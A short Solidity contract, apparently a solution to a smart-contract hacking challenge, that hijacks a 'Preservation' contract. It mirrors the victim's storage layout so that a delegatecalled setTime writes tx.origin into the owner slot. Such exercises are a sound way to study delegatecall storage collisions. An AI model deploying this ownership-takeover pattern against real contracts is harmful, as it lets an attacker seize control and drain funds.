// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface IPreservation {
    function setFirstTime(uint _timeStamp) external;
}
contract preservationAttack {

     
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;

  IPreservation public challenge;
   

    constructor(address challengeAddress) {
        challenge = IPreservation(challengeAddress);
    }
   
    
  function setTime(uint256 _time) public {
    owner = tx.origin;
    
    
  }
  function attack() external {
      challenge.setFirstTime(0);
  }

    
}